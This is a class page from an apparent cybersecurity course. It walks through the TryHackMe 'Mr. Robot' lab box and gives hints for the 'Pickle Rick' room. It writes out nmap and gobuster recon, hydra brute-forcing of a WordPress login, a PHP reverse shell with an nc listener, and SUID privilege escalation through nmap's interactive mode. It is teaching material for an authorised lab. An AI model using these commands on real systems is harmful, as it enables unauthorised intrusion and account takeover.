## üèî Previous Classes Review And Survey

!!! info "Lets Discuss What We Have Done In Class"

??? success "Class Survey"

    Please take this survey, it is completely anonymous and will help
    for future classes

??? success "Demographics Survey"

    Lets get some counts of the demographics

## üé£ Phishing Kahoot

!!! warning "Can you pick out the legit scam or contact requests?"

## ü§ñ Hacking Mr. Robot

!!! danger "Only hack machines that you have permission to do so"

[Walkthrough Link](https://www.youtube.com/watch?v=BQ4xeeNAbaw)

??? success "Step 1: Setup"

    We will connect to the TryHackMe servers using a vpn connection

    The Mr.Robot box must be started for us to actually be able to connect to
    the machine

??? success "Step 2: Active Reconnaissance"

    We are given an IP. Lets scan the IP for any open ports and services

    `nmap -sV -sC -oA <file> <ip>`

    What do the flags mean?

??? success "Step 3: More Recon"

    We see that there are open ports 80 and 443 for a webserver, lets visit
    the website.

??? success "Step 4: robots.txt"
    
    Lets see if anything is in the common robots.txt directory. Robots.txt
    will have folders and files that you don't want indexed by the browser.

    We have obtained key 1

??? success "Step 5: Directory brute force"

    Lets use gobuster to see if there are other endpoints on the web server
    that are useful to us.

    `gobuster dir -u http://10.10.170.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o scans/gosmall.txt

    We see wordpress - lets try that.

??? success "Step 6: Wordpress site"

    Lets capture a login request with burp suite.

    When we play with the login, we see that it tells us when the username
    exists or not. Lets use this to our advantage.

    `hydra -L fsocity.dic -p random 10.10.170.179 http-post-form "wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 4`

    We see the login is **Elliot**

    Lets try the passwords.

    `hydra -l Elliot -P fsocity.dic 10.10.170.179 http-post-form "wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 4`

    The password is: **ER28-0652**

??? success "Step 7: Wordpress Reverse Shell Vulnerability"

    Lets create a reverse shell into the machine hosting the server.

    We must find a reverse-php-shell on the internet and paste it into the
    archives page. Change the ip and port to matching your machine

    Lets start a nc instance and listen on port 53 (or any port)

    `nc -lvnp 53`

    We are now in the machine as DAEMON

??? success "Step 8: Escalate Privileges"

    Notice which users we can access and see what is there.

    Obtain the password

    Lets upgrade our shell

    `python -c 'import pty;pty.spawn("/bin/bash")'`

    Now we can `su robot` to login with the password we found and obtain the
    second flag

??? success "Step 9: Get Root Privileges"

    Lets look for programs that when run, run as the root user. 

    `find / -perm +6000 2>/dev/null | grep '/bin'`

    We see nmap - lets run an interactive shell

    ```
    /usr/local/bin/nmap --interactive
    !sh
    ```

    `ls /root/`

    At this point, we are a root user and can get the last key.

## üëç Hacking Picle Rick

!!! task "Your Turn To Hack"

??? abstract "Hints"

    - You will need to use nmap to scan the open ports

    - Visit the file that excludes directories

    - You will need to use gobuster to scan the directories and inspect things

    "gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt"

    - Login page is "login.php"

    - Try to make a reverse shell using netcat
    
    - sudo su
